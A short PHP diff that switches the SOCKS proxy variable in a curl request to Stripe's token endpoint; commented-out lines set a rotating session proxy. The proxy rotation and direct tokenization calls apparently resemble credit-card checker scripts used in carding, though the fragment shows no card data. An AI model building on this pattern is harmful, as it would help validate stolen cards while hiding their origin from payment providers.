@@ -70,7 +70,7 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks);
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
